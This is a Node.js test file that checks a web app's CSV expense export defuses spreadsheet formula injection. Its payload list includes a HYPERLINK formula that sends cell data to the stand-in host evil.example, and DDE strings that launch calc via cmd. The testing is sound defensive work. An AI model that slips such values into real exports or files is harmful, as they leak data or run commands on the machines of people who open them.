// The CSV export must not hand a spreadsheet something it will run as a formula.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { bootServer, client } from './helpers.js';

let srv;
let owner;
before(async () => {
  srv = await bootServer({ ALLOW_OPEN_SIGNUP: 'true' });
  owner = client(srv.base);
  await owner.post('/api/auth/register', { name: 'Owner', email: 'csv@x.com', password: 'long-enough-password-1', companyName: 'Export Co' });
});
after(async () => { await srv.close(); });

// Returns the data rows of the export, without the BOM or the header line.
async function exportRows() {
  const res = await owner.get('/api/expenses/export.csv');
  assert.equal(res.status, 200);
  return res.data.replace(/^﻿/, '').split('\r\n').slice(1).filter(Boolean);
}

test('values a spreadsheet would execute are forced to text', async () => {
  const payloads = [
    '=HYPERLINK("http://evil.example/?x="&A1,"Open invoice")',
    '@SUM(1+1)',
    "+cmd|' /C calc'!A0",
    '-2+3+cmd|\' /C calc\'!A0',
    '=1+1',
  ];
  for (const [i, vendor] of payloads.entries()) {
    const r = await owner.post('/api/expenses', { amount: '10', date: '2026-01-0' + (i + 1), vendor });
    assert.equal(r.status, 201, JSON.stringify(r.data));
  }

  const rows = await exportRows();
  assert.equal(rows.length, payloads.length);
  for (const row of rows) {
    const cells = row.split(',');
    // The vendor column is index 3, and may be quoted; either way it must not open with a formula lead.
    const vendorCell = row.slice(row.indexOf(cells[2]) + cells[2].length + 1);
    const firstChar = vendorCell.replace(/^"/, '')[0];
    assert.equal(firstChar, "'", `vendor cell should be prefixed, got: ${vendorCell.slice(0, 40)}`);
  }
  // No data row may start a field with a bare formula character.
  for (const row of rows) {
    assert.ok(!/(^|,)"?[=@]/.test(row), `a field still opens with a formula character: ${row}`);
    assert.ok(!/(^|,)"?\+[^0-9]/.test(row), `a field still opens with a plus: ${row}`);
  }
});

test('ordinary values, including negative amounts, are left alone', async () => {
  const fresh = client(srv.base);
  await fresh.post('/api/auth/register', { name: 'Two', email: 'csv2@x.com', password: 'long-enough-password-2', companyName: 'Refund Co' });
  const r = await fresh.post('/api/expenses', { amount: '-42.50', date: '2026-02-02', vendor: 'Acme Ltd', description: 'Refund for hardware' });
  assert.equal(r.status, 201, JSON.stringify(r.data));

  const res = await fresh.get('/api/expenses/export.csv');
  const row = res.data.replace(/^﻿/, '').split('\r\n')[1];
  assert.match(row, /(^|,)-42\.50(,|$)/, 'a negative amount must stay a plain number, not become text');
  assert.match(row, /(^|,)Acme Ltd(,|$)/, 'an ordinary vendor is untouched');
  assert.match(row, /Refund for hardware/);
});
